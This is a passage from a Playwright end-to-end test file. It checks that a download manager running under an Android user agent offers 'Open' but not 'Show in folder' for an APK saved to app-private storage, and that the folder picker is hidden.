  test.use({ userAgent: ANDROID_UA });

  test('K-Android - Open stays, Show in folder is not offered, the app-private path passes through', async ({ gotoApp, page }) => {
    await gotoApp();
    const pageErrors = collectPageErrors(page);
    await seedSingleAssetRelease(page, 'localsend-1.17.0-universal.apk');
    await startFromDetail(page, 'localsend', 'Android', /localsend-1\.17\.0-universal\.apk/);
    await openDownloads(page);
    const [id] = await registeredDownloadIds(page);

    // Android saves into app-private storage no file manager can browse.
    await complete(page, id, PATH_ANDROID_APK, 12_345_678, SHA_D);
    await drainToasts(page);
    const done = page.locator(sel.downloadRow('completed')).first();

    await expect(openButton(done)).toBeVisible();
    await expect(showButton(done)).toHaveCount(0);

    await openButton(done).click();
    const open = (await openerTraffic(page)).open;
    expect(open).toHaveLength(1);
    expect(open[0].path).toBe(PATH_ANDROID_APK);
    expect(open[0].with).toBeNull();

    // The footer adapts honestly: no folder picker on Android.
    await expect(page.getByText(d['downloads.androidFolderShort'])).toBeVisible();
    await expect(page.getByRole('button', { name: d['downloads.changeFolder'] })).toHaveCount(0);
    expect(pageErrors).toEqual([]);
  });
});
